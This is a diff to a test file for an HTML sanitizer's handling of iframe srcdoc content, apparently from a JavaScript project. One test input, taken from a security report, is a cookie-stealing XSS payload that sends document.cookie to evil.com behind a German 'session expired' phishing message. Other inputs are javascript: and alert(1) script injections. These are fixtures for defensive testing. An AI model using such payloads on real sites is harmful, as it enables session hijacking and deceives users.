@@ -296,14 +296,18 @@ describe("sanitizeHTMLWithConfig", () => {
 			expect(result).toContain("TestTest");
 		});
 
-		test("prevents phishing content in iframe srcdoc", () => {
-			// Phishing payload from the security report
-			const input = `<iframe srcdoc="⚠️</div><div style='font-size:22px;font-weight:bold;margin-bottom:10px;'>Ihre Sitzung ist abgelaufen</div><div style='font-size:16px;color:#666;'>Klicken Sie hier um sich erneut anzumelden</div></div></a>"></iframe>`;
+		test("prevents executable code in phishing iframe srcdoc", () => {
+			// Phishing payload combined with script execution from the security report
+			const input = `<iframe srcdoc="<script>document.location='https://evil.com/?c='+document.cookie</script>⚠️<div style='font-size:22px;'>Ihre Sitzung ist abgelaufen</div>"></iframe>`;
 			const result = sanitizeHTMLWithConfig(input, undefined);
-			// The srcdoc should not allow arbitrary HTML that enables phishing
+			// The srcdoc content must have scripts removed even when mixed with phishing HTML
+			expect(result).not.toMatch(/<script/i);
+			expect(result).not.toContain("document.location");
+			expect(result).not.toContain("document.cookie");
+			// Benign styled divs are allowed by the sanitizer config (not an XSS vector),
+			// but any executable payload must be stripped
 			if (result.includes("srcdoc")) {
-				// If srcdoc is retained, it must not contain the phishing styled HTML
-				expect(result).not.toMatch(/srcdoc\s*=\s*["'][^"']*<div[^>]*style/i);
+				expect(result).toContain("Ihre Sitzung ist abgelaufen");
 			}
 		});
 
@@ -317,6 +321,69 @@ describe("sanitizeHTMLWithConfig", () => {
 			const input = '<iframe srcdoc="<iframe src=javascript:alert(1)></iframe>"></iframe>';
 			const result = sanitizeHTMLWithConfig(input, undefined);
 			expect(result).not.toMatch(/javascript:/i);
+		});
+
+		test("preserves valid HTML content in iframe srcdoc", () => {
+			const input =
+				'<iframe srcdoc="<h1>Welcome</h1><p>This is <b>valid</b> content.</p>"></iframe>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Welcome");
+			expect(result).toContain("This is");
+			expect(result).toContain("<b>valid</b>");
+			expect(result).toContain("content.");
+		});
+
+		test("preserves styled content in iframe srcdoc", () => {
+			const input = "<iframe srcdoc=\"<div style='color:red;'>Styled text</div>\"></iframe>";
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Styled text");
+		});
+
+		test("preserves links in iframe srcdoc", () => {
+			const input =
+				"<iframe srcdoc=\"<a href='https://example.com'>Click here</a>\"></iframe>";
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Click here");
+			expect(result).toContain("https://example.com");
+		});
+
+		test("preserves images with safe src in iframe srcdoc", () => {
+			const input =
+				"<iframe srcdoc=\"<img src='https://example.com/image.png' alt='photo'>\"></iframe>";
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("https://example.com/image.png");
+		});
+
+		test("preserves lists and tables in iframe srcdoc", () => {
+			const input =
+				'<iframe srcdoc="<ul><li>Item 1</li><li>Item 2</li></ul><table><tr><td>Cell</td></tr></table>"></iframe>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Item 1");
+			expect(result).toContain("Item 2");
+			expect(result).toContain("Cell");
+		});
+
+		test("preserves plain text in iframe srcdoc", () => {
+			const input = '<iframe srcdoc="Hello, this is just plain text."></iframe>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Hello, this is just plain text.");
+		});
+
+		test("preserves valid content while stripping dangerous parts in mixed srcdoc", () => {
+			const input =
+				'<iframe srcdoc="<h1>Title</h1><script>alert(1)</script><p>Safe paragraph</p>"></iframe>';
+			const result = sanitizeHTMLWithConfig(input, undefined);
+			expect(result).toContain("srcdoc");
+			expect(result).toContain("Title");
+			expect(result).toContain("Safe paragraph");
+			expect(result).not.toMatch(/<script/i);
+			expect(result).not.toContain("alert(1)");
 		});
 
 		test("srcdoc sanitization result is stable (idempotent)", () => {
